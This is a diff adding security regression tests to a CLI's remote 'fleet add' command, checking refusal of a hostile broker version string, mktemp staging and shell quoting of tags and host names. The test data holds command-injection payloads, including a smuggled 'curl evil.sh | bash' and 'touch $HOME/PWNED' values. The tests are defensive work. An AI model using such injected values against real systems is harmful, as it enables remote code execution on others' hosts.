@@ -160,6 +160,88 @@ def test_fleet_add_dry_run_changes_nothing(ssh_stub):
 
 
 @respx.mock
+def test_fleet_add_refuses_a_hostile_broker_version(ssh_stub):
+    """Audit 2026-07-24 S1. `--version` defaults to a string the BROKER hands
+    us over /health, and it is spliced into the script piped to
+    `ssh <target> bash -s`. A compromised broker (or a MITM on a plain-http
+    JOBD_URL) must not be able to reach the remote shell through it. Fails
+    closed BEFORE ssh is invoked at all — quoting alone would merely turn the
+    payload into a baffling pip argument."""
+    argv_file, stdin_file = ssh_stub
+    respx.get(f"{_BROKER}/health").mock(
+        return_value=Response(
+            200, json={"status": "ok", "version": "0.5.28; curl evil.sh | bash; :"}
+        )
+    )
+
+    r = runner.invoke(app, ["fleet", "add", "me@gpubox"])
+    assert r.exit_code != 0, r.output
+    assert "not a plain X.Y.Z" in r.output
+    # The decisive assertion: ssh never ran, so nothing reached the host.
+    assert not argv_file.exists() and not stdin_file.exists()
+
+
+@respx.mock
+def test_fleet_add_dry_run_stages_under_mktemp_not_a_fixed_tmp_path(ssh_stub):
+    """Audit 2026-07-24 S2: a predictable path in a world-writable directory is
+    a symlink-plant away from turning the preflight `cat >` into an arbitrary
+    file write — then an execution — as the ssh user."""
+    argv_file, stdin_file = ssh_stub
+    _mock_broker(respx, worker_registered=False)
+
+    r = runner.invoke(app, ["fleet", "add", "me@gpubox", "--dry-run"])
+    assert r.exit_code == 0, r.output
+    stdin = stdin_file.read_text()
+    assert "/tmp/" not in stdin.split("install-worker.sh — set up")[0]
+    assert "d=$(mktemp -d)" in stdin
+    assert "trap 'rm -rf \"$d\"' EXIT" in stdin
+    assert 'cat > "$d/preflight.sh"' in stdin
+
+
+def test_bootstrap_script_quotes_operator_supplied_values(tmp_path, monkeypatch):
+    """Real execution (not a substring assertion): run the composed bootstrap
+    script under a real bash with a stub installer, and prove hostile `--tags`
+    / `--host-name` arrive as INERT DATA — one argv element each — instead of
+    executing. Audit 2026-07-24 S1; mutation-verified by dropping the
+    shlex.quote calls, which lands the PWNED file."""
+    import job_cli.fleet as fleet_mod
+
+    stub_installer = '#!/usr/bin/env bash\nprintf "%s\\n" "$@" > "$HOME/installer-argv"\n'
+    monkeypatch.setattr(
+        fleet_mod,
+        "_asset",
+        lambda name: stub_installer if name == "install-worker.sh" else "# stub updater\n",
+    )
+
+    payload = "gpu,cuda; touch $HOME/PWNED"
+    script = fleet_mod._bootstrap_script(
+        broker_url=_BROKER,
+        token=_TOKEN,
+        host_name="box; touch $HOME/PWNED-HOST",
+        version="0.5.28",
+        tags=payload,
+        systemd=False,
+    )
+
+    proc = subprocess.run(
+        ["bash", "-c", script],
+        env={"HOME": str(tmp_path), "PATH": "/usr/bin:/bin"},
+        capture_output=True,
+        text=True,
+    )
+    assert proc.returncode == 0, proc.stderr
+
+    # Nothing executed: neither injected command ran.
+    assert not (tmp_path / "PWNED").exists(), "tags injected into the remote shell"
+    assert not (tmp_path / "PWNED-HOST").exists(), "host name injected into the remote shell"
+
+    # And the values still arrived intact, as single argv elements.
+    argv = (tmp_path / "installer-argv").read_text().splitlines()
+    assert payload in argv, argv
+    assert "box; touch $HOME/PWNED-HOST" in argv, argv
+
+
+@respx.mock
 def test_fleet_add_no_systemd_skips_units(ssh_stub):
     argv_file, stdin_file = ssh_stub
     _mock_broker(respx, worker_registered=False)
